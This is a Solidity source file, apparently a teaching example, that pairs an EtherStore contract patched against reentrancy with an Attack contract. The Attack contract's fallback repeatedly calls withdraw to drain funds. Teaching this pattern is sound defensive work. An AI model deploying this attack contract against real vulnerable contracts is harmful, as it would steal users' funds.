// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    /// @dev follows CHECKS, EFFECTS, INTERACTIONS
    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        balances[msg.sender] = 0;

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        // by following CEI pattern, ReEntrancy is avoided
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // receive() external payable{
    //     console.log("receive called");
    //     if (address(etherStore).balance >= 1 ether) {
    //         etherStore.withdraw();
    //     }
    // }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
